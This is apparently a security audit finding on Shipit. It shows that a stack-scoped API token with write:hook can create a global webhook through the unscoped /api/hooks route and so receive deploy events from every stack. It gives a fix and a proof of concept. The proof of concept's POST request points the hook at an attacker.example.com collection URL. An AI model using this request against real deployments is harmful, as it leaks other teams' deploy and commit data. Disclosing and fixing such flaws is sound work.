### Title
Stack-scoped ApiClient with `write:hook` can create a global webhook that receives every stack's deploy/rollback/lock events - (File: app/controllers/shipit/api/hooks_controller.rb)

### Summary
An `ApiClient` can be scoped to a single stack via `stack_id`, and `Shipit::Api::BaseController#stacks`/`#stack` enforce that scoping for every stack-oriented endpoint by intersecting with `Stack.where(id: current_api_client.stack_id)` [3](#0-2) . The `HooksController`, however, is also mounted at a top-level, unscoped route, `resources :hooks, only: %i[index create show update destroy]` [4](#0-3) , distinct from the stack-nested one at line 43. When accessed at this top-level route, `params[:stack_id]` is absent, so `HooksController#stack_id` returns `nil` and `hooks` resolves to `Hook.where(stack_id: nil)` — i.e., **global** hooks [1](#0-0) . The `require_permission :write, :hook` guard only checks that the string `"write:hook"` is present in `ApiClient#permissions`; it never checks `current_api_client.stack_id` [5](#0-4) .

### Finding Description
The equality broken is: **the stack an `ApiClient` token authorizes ≠ the stack(s) its hook-write actually touches**. A token created with a `stack_id` (limiting it, per the UI/creation flow, to operate on one specific stack) and granted `write:hook` (intended to let it manage that one stack's webhooks) can instead `POST /api/hooks` (the global, unscoped route) to create a `Hook` with `stack_id: nil`. Per `Hook.deliver`, delivery uses `for_stack(stack_id)` which matches hooks whose `stack_id` is in `[nil, stack_id]` [6](#0-5) , meaning a global hook receives `deploy`, `rollback`, `lock`, `stack`, `commit_status`, `merge`, `pull_request`, etc. events for **every stack in the entire Shipit installation**, not just the one the token was scoped to. The same escape applies to `GET /api/hooks` with `read:hook`, exposing the full list of global hook configurations regardless of the caller's stack scope.

### Impact Explanation
An attacker who obtains (or is legitimately issued) a low-privilege, single-stack `ApiClient` token with `write:hook` (a permission plausibly granted so a team can register its own deployment notifications) can pivot to receiving deploy/rollback/lock/commit-status/merge/pull-request event payloads for every other stack and repository managed by the Shipit instance, by pointing a global hook's `delivery_url` at an attacker-controlled server. This is an unauthorized cross-stack read of stack state and deploy activity, satisfying the "unauthenticated/cross-scope read of stack state, task streams or deploy output" bar for High severity impact.

### Likelihood Explanation
Exploitation requires only a valid `ApiClient` token that has `write:hook` (or `read:hook`) permission and a `stack_id` restriction — a very plausible configuration for any team granted self-service webhook management for their own stack. No special privileges, race conditions, or additional guessing are needed: the attacker simply calls the documented top-level `/api/hooks` endpoint instead of the stack-nested one.

### Recommendation
Remove the top-level `resources :hooks` route (or gate it behind a permission distinct from stack-scoped `write:hook`/`read:hook`, e.g. an explicit `manage:global_hook` permission not grantable to stack-scoped clients). Additionally, `HooksController#hooks`/`#stack_id` should reject requests where `current_api_client.stack_id.present?` but no matching `stack_id` param was supplied, rather than silently falling back to the global hook scope.

### Proof of Concept
1. As an admin, create an `ApiClient` scoped to stack `myorg/myrepo/production` with permissions `['read:stack', 'write:hook']` (`ApiClient.stack_id` set).
2. Using that token's Basic Auth credentials, send:
   `POST /api/hooks` with body `{"delivery_url": "https://attacker.example.com/collect", "events": ["deploy", "rollback", "lock", "commit_status"]}`.
3. This succeeds (only `write:hook` is checked, not `stack_id`), creating a `Hook` with `stack_id: nil`.
4. Any deploy/rollback/lock event on **any** stack in the Shipit instance now triggers `Hook.deliver` → `for_stack(stack_id)` matching the new global hook, sending its payload (stack name, environment, branch, deployer, commit info, deploy status) to the attacker's server, even for stacks the token was never authorized to access.

    class << self
      def emit(event, stack, payload)
        raise "#{event} is not declared in Shipit::Hook::EVENTS" unless EVENTS.include?(event.to_s)

        Shipit::EmitEventJob.perform_later(
          event: event.to_s,
          stack_id: stack&.id,
          payload: coerce_payload(payload)
        )
        deliver_internal_hooks(event, stack, payload)
      end

      def deliver_internal_hooks(event, stack, payload)
        Shipit.internal_hook_receivers.each do |receiver|
          receiver.deliver(event, stack, payload)
        end
      end

      def deliver(event, stack_id, payload)
        for_stack(stack_id).listening_event(event).each do |hook|
          hook.deliver!(event, payload)
        end
      end
